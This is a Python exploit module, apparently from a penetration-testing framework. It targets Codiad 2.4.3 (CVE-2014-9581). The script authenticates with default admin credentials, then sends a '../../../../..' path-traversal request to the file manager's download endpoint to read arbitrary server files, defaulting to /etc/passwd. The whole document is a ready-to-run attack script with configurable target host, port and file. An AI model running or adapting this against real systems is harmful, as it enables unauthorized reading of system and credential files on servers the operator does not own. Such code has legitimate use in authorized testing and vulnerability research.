#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import logging
import sys
sys.path.append("../../")

from core.exploit.base import BaseExploit

class Exploit(BaseExploit):
    class Meta:
        vender = {
            "name":"Codiad",
            "homepage":"http://github.com/Codiad/Codiad",
        }
        max_effected_version = "2.4.3"
        cve = (2014, 9581)
        authors = [
            {
                "name":"Taurus Omar",
                "email":"taurusomar13@gmail.com",
                "homepage":"overhat.blogspot.com",
                "twitter":"@TaurusOmar_",
            },
        ]
        references = [
            "https://www.exploit-db.com/exploits/35585/"
        ]
        vulnerability = "Arbitary file read"

    options = {
        "rhost": {"default": "127.0.0.1", "necessity": True},
        "rport": {"default": 80, "necessity": True},
        "username": {"default": "admin", "necessity": True},
        "password": {"default": "admin", "necessity": True},
        "file": {"default": "/etc/passwd", "necessity": True},
        "interactive": {"default": True, "necessity": True}
    }
    session = requests.Session()

    def login(self):
        url = "http://%s:%d/components/user/controller.php?action=authenticate" % (self.get_option("rhost"), int(self.get_option("rport")))
        data = {
            "username":self.get_option("username"),
            "password":self.get_option("password"),
            "theme":"default",
            "language":"en"
        }
        response = self.session.post(url, data=data)
        content = response.content
        logging.info("[+] Login Content : %s" % (content))
        if 'status":"success"' in content:
            return True
        else:
            return False

    def exploit(self):
        host = self.get_option("rhost")
        port = int(self.get_option("rport"))
        file = self.get_option("file")
        if not self.login():
            logging.error("Login failed!")
            return False
        logging.success("Login successful!")
        url = "http://%s:%d/components/filemanager/download.php?path=../../../../..%s&type=undefined" % (host, port, file)
        try:
            response = self.session.get(url)
            if response.status_code == 200:
                logging.success("Exploit success!")
                logging.info(">>>>>> %s <<<<<<" % (file))
                print("%s" % color.blue(response.content))
                return True
            else:
                return False
        except Exception as e:
            logging.error(str(e))
            return False

def main():
    exploit = Exploit()
    exploit.show_info()
    exploit.set_option("rhost", "localhost")
    exploit.set_option("rport", 80)
    exploit.show_options()
    exploit.exploit()

if __name__ == "__main__":
    main()
